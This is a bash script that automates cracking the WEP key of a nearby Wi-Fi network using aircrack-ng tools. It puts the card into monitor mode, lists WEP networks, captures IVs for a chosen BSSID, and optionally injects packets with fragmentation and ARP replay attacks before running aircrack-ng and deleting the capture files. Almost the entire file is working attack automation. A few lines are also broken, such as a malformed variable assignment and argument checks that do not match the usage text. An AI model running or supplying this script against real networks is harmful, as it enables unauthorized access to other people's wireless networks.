#!/bin/bash
# wepcrack.sh
#
# This tool requires aircrack-ng tools to be installed and run as root
#
# ChangeLog....
VERSION="1.0"
BAND= "a" # Options are "a" 5g, B or G for 2.4g 
# Version 1.0 - First Release

#################################################################
# CHECKING FOR ROOT
#################################################################
if [ `echo -n $USER` != "root" ]
then
	echo "MESSAGE:"
	echo "MESSAGE: ERROR: Please run as root!"
	echo "MESSAGE:"
	exit 1
fi

#################################################################
# CHECKING TO SEE IF INTERFACE IS PROVIDED
#################################################################
if [ -z ${1} ]
then
	echo "MESSAGE: Version number ${VERSION}"
	echo "MESSAGE: Usage: `basename ${0}` [interface] [BSSID]"
	echo "MESSAGE: Example #`basename ${0}` wlan0 (everything else is optional)"
	exit 1
else
	INTERFACE="`echo "${1}" | cut -c 1-6`"
	echo "MESSAGE: Putting ${INTERFACE} in monitor mode"
fi

#################################################################
# GET INTERFACE MAC ADDRESS
#################################################################
MACADDRESS=`ifconfig ${INTERFACE} | grep ether | tr -s ' ' | cut -d ' ' -f3 | cut -c 1-17`
echo "MAC Addr: ${MACADDRESS}"
#################################################################
# PUT WIFI IN MONITOR MODE
#################################################################
airmon-ng check kill
airmon-ng start ${INTERFACE}
#ifconfig ${INTERFACE} down
#iwconfig ${INTERFACE} mode managed
#ifconfig ${INTERFACE} up
echo "origingal inf: $INTERFACE" 
#NEWNAME= "$INTERFACEmon"
#echo "newname = ${NEWNAME}"
INTERFACE="`echo "${1}mon"`"
echo "new interface: ${INTERFACE}" 
iwconfig ${INTERFACE} # mon0
#################################################################
# GET INTERFACE MAC ADDRESS
#################################################################
#MACADDRESS=`ifconfig ${INTERFACE} | grep ${INTERFACE} | tr -s ' ' | cut -d ' ' -f5 | cut -c 1-17`
echo "MAC Addr: ${MACADDRESS}"
#################################################################
# CHECK IF BSSID,CHANNEL & TARGETNAME WERE PROVIDED
#################################################################
if [ -z ${2} ] || [ -z ${3} ] ; then
	#################################################################
	# SHOW VISIBLE WEP NETWORKS
	#################################################################
	echo "MESSAGE: Will now display all visible WEP networks"
	echo "MESSAGE: Once you have identified the network you wish to target press Ctrl-C to exit"
	read -p "MESSAGE: Press enter to view networks"
	airodump-ng -b a --encrypt WEP ${INTERFACE} # mon0

	#################################################################
	# USER INPUT DETAILS FROM AIRODUMP
	#################################################################
	while true
	do
		echo -n "MESSAGE: Please enter the target BSSID here: "
		read -e BSSID
		echo -n "MESSAGE: Please enter the target channel here: "
		read -e CHANNEL
		echo "MESSAGE: Target BSSID            : ${BSSID}"
		echo "MESSAGE: Target Channel          : ${CHANNEL}"
		echo "MESSAGE: Interface MAC Address   : ${MACADDRESS}"
		echo -n "MESSAGE: Is this information correct? (y or n): "
	  	read -e CONFIRM
	 	case $CONFIRM in
	    		y|Y|YES|yes|Yes)
				break ;;
	    		*) echo "MESSAGE: Please re-enter information"
	  	esac
	done
fi

#################################################################
# START AIRODUMP IN XTERM WINDOW
#################################################################
echo "MESSAGE: Starting packet capture - Ctrl-c to end it"
xterm -e "airodump-ng -c ${CHANNEL} --bssid ${BSSID} --ivs -w capture ${INTERFACE}" & AIRODUMPPID=$!
sleep 2

# QUERY TO DO FRAG ATTACK
echo -n "Perform FRAGMENTATION ATTACK (y or n): "
	read -e CONFIRM
	case $CONFIRM in
		y|Y|YES|yes|Yes)
		echo "got a yes"
#################################################################
# ASSOCIATE WITH AP & THEN PERFORM FRAGMENTATION ATTACK
#################################################################
aireplay-ng -1 0 -a ${BSSID} -h ${MACADDRESS} ${INTERFACE}
aireplay-ng -5 -b ${BSSID} -h ${MACADDRESS} ${INTERFACE}
packetforge-ng -0 -a ${BSSID} -h ${MACADDRESS} -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-packet ${INTERFACE}
xterm -e "aireplay-ng -2 -r arp-packet ${INTERFACE}" & AIREPLAYPID=$!
;;
*)
esac

# QUERY TO DO ARP REPLAY ATTACK
echo -n "Perform ARP REPLAY ATTACK (y or n): "
	read -e CONFIRM
	case $CONFIRM in
		y|Y|YES|yes|Yes)
		echo "got a yes"
################################################################
# PERFORM ARP RELAY ATTACK
################################################################
xterm -e "aireplay-ng -3 -b ${BSSID} -h ${MACADDRESS} ${INTERFACE}" & AIREPLAYPID=$!
;;
*)
esac 

#################################################################
# ATTEMPTING TO CRACK
#################################################################
while true
do
	aircrack-ng -1 -a 1 -n 64 -l foundkeys -b ${BSSID} *.ivs
	echo -n "MESSAGE: Did you get the key?: (y or no)"
  	read -e CONFIRM
 	case $CONFIRM in
    		y|Y|YES|yes|Yes)
			break ;;
    		*) echo "MESSAGE: Will attempt to crack again" & sleep 3
  	esac
done

#################################################################
# DELETE FILES CREATED DURING WEP CRACKING
#################################################################
kill ${AIRODUMPPID}
kill ${AIREPLAYPID}
airmon-ng stop ${INTERFACE} #added mon
rm *.ivs *.cap *.xor
/etc/init.d/networking restart
service network-manager restart
exit 0


# nothing follows

